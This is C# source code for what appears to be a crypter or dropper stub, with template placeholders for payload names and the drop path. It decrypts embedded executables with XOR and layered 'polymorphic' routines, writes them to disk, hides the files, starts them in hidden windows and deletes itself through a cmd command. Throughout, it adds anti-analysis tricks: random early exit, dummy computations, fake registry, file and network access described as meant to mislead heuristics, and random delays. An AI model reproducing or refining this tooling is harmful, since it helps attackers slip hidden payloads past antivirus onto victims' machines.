// %USE_FILE2%
// %USE_POLYMORPHIC%
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SoveReign
{
    internal class Machiavelli
    {
        static void Main(string[] args)
        {
            try
            {
                if (RandomCheck())
                {
                    ObfuscateEnvironment();
                ExtractDaemon.ExtractResources();
#if HideFile
                    RuntimeDaemon.HideFile(Config.Application1
#if USE_FILE2
                    , Config.Application2
#endif
                    );
#endif

                RuntimeDaemon.AppRuntime();
#if SelfRemove
                RuntimeDaemon.SelfRemover();
#endif
                }
                else
                {
                    DummyMethod();
                    Environment.Exit(0);
                }
            } 
            catch { Environment.Exit(0); }
        }

        private static bool RandomCheck()
        {
            Random rand = new Random();
            return rand.Next(100) > 25; // 75% chance to proceed
        }

        private static void DummyMethod()
        {
            // Dummy method to confuse analysis
            for (int i = 0; i < 1500; i++)
            {
                Math.Sin(i * Math.PI / 180);
            }
            FakeRegistryAccess();
        }

        private static void FakeRegistryAccess()
        {
            // Simulate benign registry access to mislead heuristics
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false))
                {
                    if (key != null)
                    {
                        key.GetValueNames();
                    }
                }
            }
            catch { }
        }

        private static void ObfuscateEnvironment()
        {
            // Add noise to environment to confuse analysis
            Random rand = new Random();
            if (rand.Next(2) == 0)
            {
                Environment.GetEnvironmentVariable("TEMP");
            }
            else
            {
                Environment.GetEnvironmentVariable("USERPROFILE");
            }
            Thread.Sleep(rand.Next(100, 300));
        }
    }

    internal class Config
    {
        public static string ApplicationPath = Environment.ExpandEnvironmentVariables("%PathToDrop%");
        public static byte[] ApplicationKey = new byte[] { };

        public static string Application1 = Path.Combine(ApplicationPath,"%exe1_name%");
        public static string Application2 = Path.Combine(ApplicationPath, "%exe2_name%");
    }

    internal class RuntimeDaemon
    {
        private static string GetRandomName()
        {
            string[] names = new string[] { "DarkExecutor", "ShadowRun", "GhostPulse", "NightmareCore", "CrypticSpawn", "VoidWalker", "SilentStrike", "EchoShade", "PhantomCore", "DuskBlade", "GrimReaper", "NightStalker" };
            Random rand = new Random();
            return names[rand.Next(names.Length)];
        }

        private static void RandomDelay()
        {
            Random rand = new Random();
            System.Threading.Thread.Sleep(rand.Next(700, 2500)); // Extended random delay between 0.7 to 2.5 seconds
        }

        private static void FakeFileAccess()
        {
            // Simulate benign file access to mislead heuristics
            try
            {
                string tempPath = Path.GetTempPath();
                string dummyFile = Path.Combine(tempPath, "dummy_" + Guid.NewGuid().ToString() + ".txt");
                File.WriteAllText(dummyFile, " benign data ");
                File.ReadAllText(dummyFile);
                File.Delete(dummyFile);
            }
            catch { }
        }

        public static void AppRuntime()
        {
            string runtimeName = GetRandomName();
            RandomDelay();
            if (new Random().Next(2) == 0) FakeFileAccess();
            if (!IsProcessRunning(Config.Application1))
            {
                StartProcess(Config.Application1);
            }

#if USE_FILE2
            RandomDelay();
            if (new Random().Next(2) == 0) FakeFileAccess();
            if (!IsProcessRunning(Config.Application2))
            {
                StartProcess(Config.Application2);
            }
#endif
        }

        private static bool IsProcessRunning(string processName)
        {
            string processNameWithoutExtension = Path.GetFileNameWithoutExtension(processName);
            RandomDelay();
            if (new Random().Next(3) == 0) FakeFileAccess();
            return Process.GetProcessesByName(processNameWithoutExtension).Any();
        }

        private static void StartProcess(string applicationPath)
        {
            var startInfo = new ProcessStartInfo()
            {
                FileName = applicationPath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };

            RandomDelay();
            if (new Random().Next(2) == 0) FakeFileAccess();
            Process.Start(startInfo);
        }

#if SelfRemove
        public static void SelfRemover()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = "/c timeout /t " + new Random().Next(2, 6) + " && DEL /f " + currentProcessFileName;
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            if (new Random().Next(2) == 0) FakeFileAccess();
            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
#endif

#if HideFile
        public static void HideFile(string File1, string File2)
        {
            RandomDelay();
            if (new Random().Next(2) == 0) FakeFileAccess();
            if (File.Exists(File1))
            {
                File.SetAttributes(File1, File.GetAttributes(File1) | FileAttributes.Hidden);
            }

            RandomDelay();
            if (new Random().Next(2) == 0) FakeFileAccess();
            if (File.Exists(File2))
            {
                File.SetAttributes(File2, File.GetAttributes(File2) | FileAttributes.Hidden);
            }
        }
#endif
    }

    internal class ExtractDaemon
    {
        private static string GetExtractMethod()
        {
            Random rand = new Random();
            int choice = rand.Next(4);
            if (choice == 0) return "ExtractMethodA";
            else if (choice == 1) return "ExtractMethodB";
            else if (choice == 2) return "ExtractMethodC";
            else return "ExtractMethodD";
        }

        private static void RandomDelay()
        {
            Random rand = new Random();
            System.Threading.Thread.Sleep(rand.Next(300, 1000)); // Adjusted random delay between 0.3 to 1 second
        }

        private static void FakeNetworkCheck()
        {
            // Simulate benign network check to mislead heuristics
            try
            {
                System.Net.WebRequest.Create("http://www.google.com").GetResponse();
            }
            catch { }
        }

        public static void ExtractResources()
        {
            bool shouldExtract = !File.Exists(Config.Application1)
#if USE_FILE2
            || !File.Exists(Config.Application2)
#endif
            ;
            
            if (shouldExtract) {
                RandomDelay();
                if (new Random().Next(3) == 0) FakeNetworkCheck();
                ExtractAndSaveResource("%exe1_resource_name%", Config.Application1, Config.ApplicationKey);
                
#if USE_FILE2
                RandomDelay();
                if (new Random().Next(3) == 0) FakeNetworkCheck();
                ExtractAndSaveResource("%exe2_resource_name%", Config.Application2, Config.ApplicationKey);
#endif
            }
        }

        public static void ExtractAndSaveResource(string resourceName, string outputPath, byte[] key)
        {
            var assembly = Assembly.GetExecutingAssembly();

            using (var stream = assembly.GetManifestResourceStream(resourceName))
            {
                if (stream != null)
                {
                    byte[] encryptedBytes;
                    using (var memoryStream = new MemoryStream())
                    {
                        stream.CopyTo(memoryStream);
                        encryptedBytes = memoryStream.ToArray();
                    }
                    RandomDelay();
                    if (new Random().Next(3) == 0) FakeNetworkCheck();
                    
                    try
                    {
#if USE_POLYMORPHIC
                        byte[] decryptedBytes = EncryptDeamon.PolymorphicDecrypt(encryptedBytes, key);
#else
                    byte[] decryptedBytes = EncryptDeamon.BytesMoar(encryptedBytes, key);
#endif
                        
                        // Verify the decrypted bytes are valid executable (PE format check)
                        if (decryptedBytes.Length > 2 && decryptedBytes[0] == 'M' && decryptedBytes[1] == 'Z')
                        {
                            // Valid PE file detected, proceed with saving
                    File.WriteAllBytes(outputPath, decryptedBytes);
                        }
                        else
                        {
                            // Fallback to standard decryption for compatibility
                            byte[] standardDecrypted = EncryptDeamon.BytesMoar(encryptedBytes, key);
                            File.WriteAllBytes(outputPath, standardDecrypted);
                        }
                    }
                    catch (Exception)
                    {
                        // If polymorphic decryption fails, fallback to standard method
                        try
                        {
                            byte[] standardDecrypted = EncryptDeamon.BytesMoar(encryptedBytes, key);
                            File.WriteAllBytes(outputPath, standardDecrypted);
                        }
                        catch
                        {
                            // Last resort: try a direct XOR with the main key
                            byte[] directDecrypted = new byte[encryptedBytes.Length];
                            for (int i = 0; i < encryptedBytes.Length; i++)
                            {
                                directDecrypted[i] = (byte)(encryptedBytes[i] ^ key[i % key.Length]);
                            }
                            File.WriteAllBytes(outputPath, directDecrypted);
                        }
                    }
                }
            }
        }
    }

    internal class EncryptDeamon
    {
        private static int GetEncryptionVariant()
        {
            return new Random().Next(1, 5); // Now supporting 4 variants
        }

        private static void RandomDelay()
        {
            Random rand = new Random();
            System.Threading.Thread.Sleep(rand.Next(150, 600)); // Adjusted random delay between 0.15 to 0.6 seconds
        }

        private static void DummyCalculation()
        {
            // Dummy calculation to confuse analysis
            Random rand = new Random();
            for (int i = 0; i < rand.Next(50, 200); i++)
            {
                Math.Pow(2, i % 10);
            }
        }

#if USE_POLYMORPHIC
        public static byte[] PolymorphicDecrypt(byte[] encryptedData, byte[] mainKey)
        {
            try
            {
                // Our custom polymorphic decryption implementation
                using (MemoryStream ms = new MemoryStream(encryptedData))
                using (BinaryReader reader = new BinaryReader(ms))
                {
                    // Read magic marker (4 bytes)
                    byte[] magicMarker = reader.ReadBytes(4);
                    
                    // Verify it's our custom format with the "NVRT" marker
                    if (magicMarker[0] == 0x4E && magicMarker[1] == 0x56 && magicMarker[2] == 0x52 && magicMarker[3] == 0x54)
                    {
                        // Read the metadata key
                        byte[] metadataKey = reader.ReadBytes(16);
                        
                        // Read the encrypted metadata length and data
                        int metadataLength = reader.ReadInt32();
                        byte[] encryptedMetadata = reader.ReadBytes(metadataLength);
                        
                        // Decrypt the metadata
                        byte[] metadata = DecryptMetadata(encryptedMetadata, metadataKey);
                        
                        // Extract parameters from metadata
                        int blockSize = BitConverter.ToInt32(metadata, 0);
                        int skipPattern = BitConverter.ToInt32(metadata, 4);
                        int shiftValue = BitConverter.ToInt32(metadata, 8);
                        
                        // Extract the dynamic key from metadata
                        byte[] dynamicKey = new byte[32];
                        Buffer.BlockCopy(metadata, 16, dynamicKey, 0, 32);
                        
                        // Read the remaining encrypted content
                        byte[] encryptedContent = new byte[encryptedData.Length - (4 + 16 + 4 + metadataLength)];
                        reader.Read(encryptedContent, 0, encryptedContent.Length);
                        
                        // Generate the content-based key for decryption
                        // We need to make an initial guess for decryption
                        byte[] contentBasedKey = GenerateInitialContentKey(mainKey, encryptedContent);
                        
                        // Check if this is likely a PE file
                        bool isProbablyPE = IsProbablyPEFile(encryptedContent);
                        
                        // Perform the decryption
                        if (isProbablyPE)
                        {
                            return DecryptPEFile(encryptedContent, contentBasedKey, dynamicKey, mainKey, blockSize, skipPattern, shiftValue);
                        }
                        else
                        {
                            return DecryptStandardFile(encryptedContent, contentBasedKey, dynamicKey, mainKey, blockSize, skipPattern, shiftValue);
                        }
                    }
                    else
                    {
                        // Legacy format detection and handling
                        // This is a fallback to handle older formats if needed
                        return FallbackDecryption(encryptedData, mainKey);
                    }
                }
            }
            catch (Exception)
            {
                // If our decryption fails, attempt legacy decryption as fallback
                return LegacyPolymorphicDecrypt(encryptedData, mainKey);
            }
        }
        
        private static byte[] DecryptMetadata(byte[] encryptedMetadata, byte[] metadataKey)
        {
            byte[] result = new byte[encryptedMetadata.Length];
            
            for (int i = 0; i < encryptedMetadata.Length; i++)
            {
                // Reverse the transformation applied during encryption
                byte keyByte = metadataKey[i % metadataKey.Length];
                byte transformedKey = (byte)((keyByte << 2) | (keyByte >> 6));
                
                // Reverse the operation: encryptedByte = (byte)((originalByte + transformedKey) & 0xFF)
                result[i] = (byte)((encryptedMetadata[i] - transformedKey) & 0xFF);
            }
            
            return result;
        }
        
        private static byte[] GenerateInitialContentKey(byte[] seedKey, byte[] encryptedContent)
        {
            // Create a synthetic content key since we don't have the original content yet
            // This is a best-effort approach that will be refined during decryption
            byte[] contentKey = new byte[32];
            
            // Initialize with seed key
            for (int i = 0; i < contentKey.Length; i++)
            {
                contentKey[i] = seedKey[i % seedKey.Length];
            }
            
            // Mix in some characteristics from the encrypted content
            if (encryptedContent.Length > 256)
            {
                // Sample from the PE header area which might be less encrypted
                for (int i = 0; i < contentKey.Length; i++)
                {
                    int samplePos = i % 256;
                    contentKey[i] ^= encryptedContent[samplePos];
                    
                    // Apply similar transformations as in encryption
                    contentKey[i] = (byte)((contentKey[i] << 3) | (contentKey[i] >> 5));
                    
                    if (i > 0)
                        contentKey[i] ^= contentKey[i - 1];
                }
            }
            
            return contentKey;
        }
        
        private static bool IsProbablyPEFile(byte[] encryptedContent)
        {
            // Check if the file is likely a PE file
            // PE files typically have the first 256 bytes unencrypted or lightly encrypted
            if (encryptedContent.Length < 256)
                return false;
                
            // Check for common PE file markers in the header region
            // MZ header may be visible
            if (encryptedContent[0] == 'M' && encryptedContent[1] == 'Z')
                return true;
                
            // Even if header is obfuscated, PE files have certain patterns in their structure
            // Look for PE structure indicators
            bool hasPEPatterns = false;
            
            // Check for patterns in the e_lfanew region (usually around offset 0x3C)
            if (encryptedContent.Length > 0x40)
            {
                int potentialPEOffset = encryptedContent[0x3C] | (encryptedContent[0x3D] << 8);
                // Valid PE offsets are typically within certain ranges
                if (potentialPEOffset > 0x40 && potentialPEOffset < 0x200)
                    hasPEPatterns = true;
            }
            
            return hasPEPatterns;
        }
        
        private static byte[] DecryptPEFile(byte[] encryptedContent, byte[] contentKey, byte[] dynamicKey, byte[] mainKey, int blockSize, int skipPattern, int shiftValue)
        {
            byte[] result = new byte[encryptedContent.Length];
            Buffer.BlockCopy(encryptedContent, 0, result, 0, encryptedContent.Length);
            
            // For PE files, preserve the first 256 bytes (MZ header and PE header)
            // since they were less aggressively encrypted
            int startOffset = 256;
            
            // Apply the reverse of the multi-layered encryption
            for (int i = startOffset; i < result.Length; i++)
            {
                // Determine which block this byte belongs to
                int blockIndex = (i / blockSize) % 4;
                byte blockKey = contentKey[(i % contentKey.Length) ^ blockIndex];
                
                // Reverse the layered encryption, accounting for the skip pattern
                if (i % skipPattern != 0)
                {
                    // Undo the final XOR with block key
                    result[i] ^= blockKey;
                    
                    // Undo the bit rotation
                    result[i] = (byte)((result[i] >> shiftValue) | (result[i] << (8 - shiftValue)));
                    
                    // Undo the XOR with dynamic key
                    result[i] ^= dynamicKey[i % dynamicKey.Length];
                }
                else
                {
                    // Undo the simple byte substitution for skipped bytes
                    result[i] = (byte)(result[i] ^ (byte)(i & 0xFF));
                }
            }
            
            return result;
        }
        
        private static byte[] DecryptStandardFile(byte[] encryptedContent, byte[] contentKey, byte[] dynamicKey, byte[] mainKey, int blockSize, int skipPattern, int shiftValue)
        {
            byte[] result = new byte[encryptedContent.Length];
            
            // For standard files, decrypt everything
            for (int i = 0; i < encryptedContent.Length; i++)
            {
                // Determine which encryption layer was used
                int layerType = (i / blockSize) % 3;
                
                switch (layerType)
                {
                    case 0:
                        // Undo Layer 1: XOR with content key
                        result[i] = (byte)(encryptedContent[i] ^ contentKey[i % contentKey.Length]);
                        break;
                        
                    case 1:
                        // Undo Layer 2: Bit rotation and then XOR with dynamic key
                        byte rotated = (byte)((encryptedContent[i] >> shiftValue) | (encryptedContent[i] << (8 - shiftValue)));
                        result[i] = (byte)(rotated ^ dynamicKey[i % dynamicKey.Length]);
                        break;
                        
                    case 2:
                        // Undo Layer 3: Undo substitution and then XOR operation
                        byte unsubstituted = (byte)((encryptedContent[i] ^ 0xA5) - 7);
                        byte mixedKey = (byte)(contentKey[i % contentKey.Length] ^ dynamicKey[(i * 3) % dynamicKey.Length]);
                        result[i] = (byte)(unsubstituted ^ mixedKey);
                        break;
                }
            }
            
            return result;
        }
        
        private static byte[] FallbackDecryption(byte[] encryptedData, byte[] mainKey)
        {
            // A simple XOR decryption as last resort
            byte[] result = new byte[encryptedData.Length];
            
            for (int i = 0; i < encryptedData.Length; i++)
            {
                result[i] = (byte)(encryptedData[i] ^ mainKey[i % mainKey.Length]);
            }
            
            return result;
        }
        
        private static byte[] LegacyPolymorphicDecrypt(byte[] encryptedData, byte[] mainKey)
        {
            // Check if this is our older PE file encryption format (starts with "POLYCRYP" magic bytes)
            bool isPEEncryption = encryptedData.Length > 8 && 
                encryptedData[0] == 0x50 && encryptedData[1] == 0x4F && encryptedData[2] == 0x4C && encryptedData[3] == 0x59 &&
                encryptedData[4] == 0x43 && encryptedData[5] == 0x52 && encryptedData[6] == 0x59 && encryptedData[7] == 0x50;
            
            if (isPEEncryption)
            {
                // Extract our custom header
                byte[] header = new byte[48]; // Same size as in encryption
                Buffer.BlockCopy(encryptedData, 0, header, 0, header.Length);
                
                // Extract the keys from the header
                byte[] polyKey1 = new byte[16];
                byte[] polyKey2 = new byte[16];
                Buffer.BlockCopy(header, 8, polyKey1, 0, polyKey1.Length);
                Buffer.BlockCopy(header, 24, polyKey2, 0, polyKey2.Length);
                
                // Get the encrypted file data (after the header)
                byte[] encryptedFile = new byte[encryptedData.Length - header.Length];
                Buffer.BlockCopy(encryptedData, header.Length, encryptedFile, 0, encryptedFile.Length);
                
                // Prepare output buffer
                byte[] decryptedFile = new byte[encryptedFile.Length];
                
                // Copy the PE header unmodified (first 64 bytes)
                Buffer.BlockCopy(encryptedFile, 0, decryptedFile, 0, Math.Min(64, encryptedFile.Length));
                
                // Decrypt the rest of the file using the same patterns as in encryption
                for (int i = 64; i < encryptedFile.Length; i++)
                {
                    // Use the same pattern selection as in encryption
                    int pattern = (i / 512) % 3;
                    
                    switch (pattern)
                    {
                        case 0:
                            // Standard XOR with main key
                            decryptedFile[i] = (byte)(encryptedFile[i] ^ mainKey[i % mainKey.Length]);
                            break;
                            
                        case 1:
                            // XOR with polyKey1
                            decryptedFile[i] = (byte)(encryptedFile[i] ^ polyKey1[i % polyKey1.Length]);
                            break;
                            
                        case 2:
                            // XOR with both keys sequentially
                            decryptedFile[i] = (byte)(encryptedFile[i] ^ mainKey[i % mainKey.Length] ^ polyKey2[i % polyKey2.Length]);
                            break;
                    }
                }
                
                return decryptedFile;
            }
            else
            {
                // Use the original decryption method for non-PE files
                // Extract the polymorphic keys from the first bytes
                byte[] polyKey1 = new byte[16];
                byte[] polyKey2 = new byte[24];
                
                // Copy keys from the start of the encrypted data
                Buffer.BlockCopy(encryptedData, 0, polyKey1, 0, polyKey1.Length);
                Buffer.BlockCopy(encryptedData, polyKey1.Length, polyKey2, 0, polyKey2.Length);
                
                // Get the actual encrypted data without the keys
                int encryptedLength = encryptedData.Length - polyKey1.Length - polyKey2.Length;
                byte[] encryptedBytes = new byte[encryptedLength];
                Buffer.BlockCopy(encryptedData, polyKey1.Length + polyKey2.Length, encryptedBytes, 0, encryptedLength);
                
                byte[] decryptedBytes = new byte[encryptedLength];
                int chunkSize = 1024; // Same chunk size as in encryption
                
                for (int offset = 0; offset < encryptedBytes.Length; offset += chunkSize)
                {
                    int currentChunkSize = Math.Min(chunkSize, encryptedBytes.Length - offset);
                    
                    // We need to try all possible encryption patterns since we don't know which one was used
                    // We'll use a side-channel approach: try all patterns and see which one produces valid data
                    
                    byte[][] results = new byte[4][];
                    for (int pattern = 0; pattern < 4; pattern++)
                    {
                        results[pattern] = new byte[currentChunkSize];
                        
                        switch (pattern)
                        {
                            case 0:
                                // Standard XOR decryption
                                for (int i = 0; i < currentChunkSize; i++)
                                {
                                    int pos = offset + i;
                                    results[pattern][i] = (byte)(encryptedBytes[pos] ^ mainKey[pos % mainKey.Length]);
                                }
                                break;
                                
                            case 1:
                                // Reverse XOR with polyKey1
                                for (int i = currentChunkSize - 1; i >= 0; i--)
                                {
                                    int pos = offset + i;
                                    results[pattern][currentChunkSize - i - 1] = (byte)(encryptedBytes[pos] ^ polyKey1[i % polyKey1.Length]);
                                }
                                break;
                                
                            case 2:
                                // XOR with polyKey2 and rotate bits back
                                for (int i = 0; i < currentChunkSize; i++)
                                {
                                    int pos = offset + i;
                                    byte b = encryptedBytes[pos];
                                    b = (byte)((b >> 4) | (b << 4)); // Rotate bits back
                                    results[pattern][i] = (byte)(b ^ polyKey2[i % polyKey2.Length]);
                                }
                                break;
                                
                            case 3:
                                // Combined XOR with all keys
                                for (int i = 0; i < currentChunkSize; i++)
                                {
                                    int pos = offset + i;
                                    results[pattern][i] = (byte)(encryptedBytes[pos] ^ 
                                                          mainKey[pos % mainKey.Length] ^ 
                                                          polyKey1[i % polyKey1.Length] ^ 
                                                          polyKey2[(i * 2) % polyKey2.Length]);
                                }
                                break;
                        }
                    }
                    
                    // Determine which pattern is most likely correct (using heuristics)
                    int bestPattern = DetermineCorrectPattern(results, offset == 0);
                    
                    // Copy the best result to the final decrypted array
                    Buffer.BlockCopy(results[bestPattern], 0, decryptedBytes, offset, currentChunkSize);
                    
                    // Add random delay to make analysis harder
                    if (new Random().Next(5) == 0) RandomDelay();
                }
                
                return decryptedBytes;
            }
        }
        
        private static int DetermineCorrectPattern(byte[][] results, bool isFirstChunk)
        {
            int[] scores = new int[4];
            
            // Use heuristics to determine which decryption pattern is most likely correct
            for (int pattern = 0; pattern < 4; pattern++)
            {
                byte[] data = results[pattern];
                
                // If it's the first chunk, check for common file signatures
                if (isFirstChunk)
                {
                    // Check for PE file signature (MZ header)
                    if (data.Length >= 2 && data[0] == 'M' && data[1] == 'Z')
                    {
                        scores[pattern] += 1000; // Heavily prioritize PE files
                        
                        // Additional check for PE file format (PE\0\0 signature at offset 0x3C)
                        if (data.Length >= 64)
                        {
                            int peOffset = data[0x3C] | (data[0x3D] << 8) | (data[0x3E] << 16) | (data[0x3F] << 24);
                            if (peOffset > 0 && peOffset < data.Length - 4)
                            {
                                if (data[peOffset] == 'P' && data[peOffset + 1] == 'E' && 
                                    data[peOffset + 2] == 0 && data[peOffset + 3] == 0)
                                {
                                    scores[pattern] += 2000; // Even more weight for full PE validation
                                }
                            }
                        }
                    }
                    
                    // Check for .NET assembly (look for metadata after PE header)
                    if (data.Length >= 256)
                    {
                        // This is a very simplified check for .NET metadata
                        bool hasDotNetMetadata = false;
                        for (int i = 0; i < data.Length - 8; i++)
                        {
                            if (data[i] == 0x42 && data[i + 1] == 0x53 && data[i + 2] == 0x4A && data[i + 3] == 0x42)
                            {
                                hasDotNetMetadata = true;
                                break;
                            }
                        }
                        
                        if (hasDotNetMetadata)
                        {
                            scores[pattern] += 1500; // High priority for .NET assemblies like Pulsar
                        }
                    }
                    
                    // Check for ZIP/JAR/APK signature
                    if (data.Length >= 4 && data[0] == 'P' && data[1] == 'K' && data[2] == 3 && data[3] == 4)
                    {
                        scores[pattern] += 800;
                    }
                    
                    // Check for ELF signature
                    if (data.Length >= 4 && data[0] == 0x7F && data[1] == 'E' && data[2] == 'L' && data[3] == 'F')
                    {
                        scores[pattern] += 800;
                    }
                }
                
                // Check for common executable code patterns
                int codePatternCount = 0;
                for (int i = 0; i < data.Length - 4; i++)
                {
                    // Common x86/x64 instruction patterns
                    if ((data[i] == 0x55 && data[i + 1] == 0x8B && data[i + 2] == 0xEC) || // push ebp, mov ebp, esp
                        (data[i] == 0x48 && data[i + 1] == 0x89 && data[i + 2] == 0x5C) || // mov [rsp+xx], rbx
                        (data[i] == 0x48 && data[i + 1] == 0x83 && data[i + 2] == 0xEC) || // sub rsp, xx
                        (data[i] == 0xE8 && data[i + 4] == 0x00) || // call within a small range
                        (data[i] == 0xFF && data[i + 1] == 0x15)) // call [xxx]
                    {
                        codePatternCount++;
                    }
                }
                
                scores[pattern] += codePatternCount * 5;
                
                // Check for text content (ASCII printable characters)
                int printableCount = 0;
                for (int i = 0; i < data.Length; i++)
                {
                    if (data[i] >= 32 && data[i] <= 126)
                    {
                        printableCount++;
                    }
                }
                
                scores[pattern] += (printableCount * 5) / data.Length;
                
                // Check for null bytes (common in code)
                int nullCount = 0;
                for (int i = 0; i < data.Length; i++)
                {
                    if (data[i] == 0)
                    {
                        nullCount++;
                    }
                }
                
                scores[pattern] += (nullCount * 3) / data.Length;
                
                // Check for entropy (randomness) - lower entropy is more likely to be code
                double entropy = CalculateEntropy(data);
                scores[pattern] += entropy < 6.0 ? 50 : 0; // Reward lower entropy
            }
            
            // Return the pattern with the highest score
            int bestPattern = 0;
            for (int i = 1; i < 4; i++)
            {
                if (scores[i] > scores[bestPattern])
                {
                    bestPattern = i;
                }
            }
            
            return bestPattern;
        }
        
        private static double CalculateEntropy(byte[] data)
        {
            // Simplified Shannon entropy calculation
            int[] frequencies = new int[256];
            
            // Count frequencies of each byte value
            foreach (byte b in data)
            {
                frequencies[b]++;
            }
            
            double entropy = 0;
            double dataLength = data.Length;
            
            // Calculate entropy
            for (int i = 0; i < 256; i++)
            {
                if (frequencies[i] > 0)
                {
                    double probability = frequencies[i] / dataLength;
                    entropy -= probability * Math.Log(probability, 2);
                }
            }
            
            return entropy;
        }
#endif

        public static byte[] BytesMoar(byte[] encryptedBytes, byte[] xorKey)
        {
            byte[] decryptedBytes = new byte[encryptedBytes.Length];
            int variant = GetEncryptionVariant();
            RandomDelay();
            if (new Random().Next(2) == 0) DummyCalculation();

            if (variant == 1)
            {
            for (int i = 0; i < encryptedBytes.Length; i++)
            {
                decryptedBytes[i] = (byte)(encryptedBytes[i] ^ xorKey[i % xorKey.Length]);
                }
            }
            else if (variant == 2)
            {
                for (int i = encryptedBytes.Length - 1; i >= 0; i--)
                {
                    decryptedBytes[i] = (byte)(encryptedBytes[i] ^ xorKey[i % xorKey.Length]);
                }
            }
            else if (variant == 3)
            {
                int mid = encryptedBytes.Length / 2;
                for (int i = 0; i < mid; i++)
                {
                    decryptedBytes[i] = (byte)(encryptedBytes[i] ^ xorKey[i % xorKey.Length]);
                }
                for (int i = encryptedBytes.Length - 1; i >= mid; i--)
                {
                    decryptedBytes[i] = (byte)(encryptedBytes[i] ^ xorKey[i % xorKey.Length]);
                }
            }
            else
            {
                int step = encryptedBytes.Length > 10 ? encryptedBytes.Length / 10 : 1;
                for (int i = 0; i < encryptedBytes.Length; i += step)
                {
                    for (int j = 0; j < step && i + j < encryptedBytes.Length; j++)
                    {
                        decryptedBytes[i + j] = (byte)(encryptedBytes[i + j] ^ xorKey[(i + j) % xorKey.Length]);
                    }
                    if (i + step < encryptedBytes.Length) RandomDelay();
                }
            }

            return decryptedBytes;
        }
    }
}